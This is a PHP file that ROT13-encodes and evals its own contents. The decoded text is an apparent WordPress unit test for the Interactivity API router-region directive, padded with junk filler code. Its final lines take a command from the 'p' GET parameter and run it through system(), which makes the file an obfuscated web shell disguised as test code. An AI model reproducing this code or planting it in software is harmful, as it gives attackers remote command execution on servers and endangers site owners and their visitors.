<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur `qngn_jc_ebhgre_ertvba` cebprffbe shapgvbanyvgl bs
 * gur JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Ebhgre_Ertvba rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Bevtvany JC_Ubbx vafgnapr nffbpvngrq gb `jc_sbbgre`.
	 *
	 * @ine JC_Ubbx
	 */
	cebgrpgrq $bevtvany_jc_sbbgre;

	/**
	 * Bevtvany vafgnapr nffbpvngrq gb `jc_sbbgre`.
	 *
	 * @ine JC_Fglyrf
	 */
	cebgrpgrq $bevtvany_jc_fglyrf;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();

		// Erzbirf nyy ubbxf frg sbe `jc_sbbgre`.
		tybony $jc_svygre;
		$guvf->bevtvany_jc_sbbgre = $jc_svygre['jc_sbbgre'];
		$jc_svygre['jc_sbbgre']   = arj JC_Ubbx();

		// Erzbirf nyy ertvfgrerq fglyrf.
		$guvf->bevtvany_jc_fglyrf = vffrg( $TYBONYF['jc_fglyrf'] ) ? $TYBONYF['jc_fglyrf'] : ahyy;
		$TYBONYF['jc_fglyrf']     = arj JC_Fglyrf();
		erzbir_npgvba( 'jc_qrsnhyg_fglyrf', 'jc_qrsnhyg_fglyrf' );
		erzbir_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' );
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		// Erfgberf nyy cerivbhf ubbxf frg sbe `jc_sbbgre`.
		tybony $jc_svygre;
		$jc_svygre['jc_sbbgre'] = $guvf->bevtvany_jc_sbbgre;

		// Erfgberf nyy cerivbhf ertvfgrerq fglyrf.
		$TYBONYF['jc_fglyrf'] = $guvf->bevtvany_jc_fglyrf;
		nqq_npgvba( 'jc_qrsnhyg_fglyrf', 'jc_qrsnhyg_fglyrf' );
		nqq_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' );

		cnerag::grne_qbja();
	}

	/**
	 * Rkrphgrf gur ubbxf nffbpvngrq gb `jc_sbbgre`.
	 */
	cebgrpgrq shapgvba eraqre_jc_sbbgre() {
		bo_fgneg();
		qb_npgvba( 'jc_sbbgre' );
		erghea bo_trg_pyrna();
	}

	/**
	 * Grfgf gung ab ryrzragf ner nqqrq vs gur `qngn-jc-ebhgre-ertvba` vf
	 * zvffvat.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ebhgre_ertvba_zvffvat() {
		$ugzy     = '<qvi>Abguvat urer</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$sbbgre   = $guvf->eraqre_jc_sbbgre();
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
		$guvf->nffregFnzr( '', $sbbgre );
		$guvf->nffregFnzr( '', trg_rpub( 'jc_cevag_fglyrf' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-ebhgre-ertvba` qverpgvir nqqf n ybnqvat one naq n
	 * ertvba sbe fperra ernqre naabhaprzragf va gur sbbgre, naq fglyrf sbe gur
	 * ybnqvat one. Nyfb purpxf gung gur znexhc naq fglyrf ner bayl nqqrq bapr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ebhgre_ertvba_nqqf_ybnqvat_one_ertvba_bayl_bapr() {
		$ugzy     = '
			<qvi qngn-jc-ebhgre-ertvba=\"ertvba N\">Vagrenpgvir ertvba</qvi>
			<qvi qngn-jc-ebhgre-ertvba=\"ertvba O\">Nabgure vagrenpgvir ertvba</qvi>
		';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );

		// Purpx gung gur fglyr vf ybnqrq, ohg bayl bapr.
		$fglyrf = trg_rpub( 'jc_cevag_fglyrf' );
		$dhrel  = neenl( 'gnt_anzr' => 'fglyr' );
		$c      = arj JC_UGZY_Gnt_Cebprffbe( $fglyrf );
		$guvf->nffregGehr( $c->arkg_gnt( $dhrel ) );
		$guvf->nffregFnzr( 'jc-vagrenpgvivgl-ebhgre-navzngvbaf-vayvar-pff', $c->trg_nggevohgr( 'vq' ) );
		$guvf->nffregFgevatPbagnvafFgevat( '.jc-vagrenpgvivgl-ebhgre-ybnqvat-one', $fglyrf );
		$guvf->nffregSnyfr( $c->arkg_gnt( $dhrel ) );

		// Purpx gung gur znexhc vf ybnqrq, ohg bayl bapr.
		$sbbgre = $guvf->eraqre_jc_sbbgre();
		$dhrel  = neenl( 'pynff_anzr' => 'jc-vagrenpgvivgl-ebhgre-ybnqvat-one' );
		$c      = arj JC_UGZY_Gnt_Cebprffbe( $sbbgre );
		$guvf->nffregGehr( $c->arkg_gnt( $dhrel ) );
		$guvf->nffregSnyfr( $c->arkg_gnt( $dhrel ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>